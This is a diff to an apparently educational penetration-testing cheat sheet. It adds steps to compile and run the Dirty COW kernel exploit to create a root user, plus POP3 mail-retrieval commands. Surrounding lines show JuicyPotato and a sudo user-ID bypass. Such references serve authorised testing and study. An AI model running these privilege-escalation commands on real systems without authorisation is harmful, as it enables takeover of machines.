@@ -43,6 +43,7 @@
 40. [Client Side Attacks](#Client-Side-Attacks)
 41. [Powershell Empire](#Powershell-Empire)
 42. [SQL Enumeration](#SQL-Enumeration)
+42. [POP3](#POP3)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -1576,6 +1577,13 @@ C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\exe.exe -l 5837
 sudo -u#-1 /bin/bash
 ```
 
+## Dirtyc0w kernel exploit
+* see https://github.com/firefart/dirtycow
+1. Transfer .c file to target
+2. compile it with ``gcc -pthread dirty.c -o dirty -lcrypt``
+3. execute the binary ``./dirty newpassword``
+4. user ``firefart`` is created with root privileges
+
 ## Unix Privesc Check
 * [unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)
 
@@ -3023,7 +3031,10 @@ show variables;
 ```
 
 
-
-
-
-
+# POP3
+Connect to port 110 and retreive mails (authenticated)
+```
+USER username
+PASS password
+LIST # list all mails
+RETR 1 # retreive mail 1
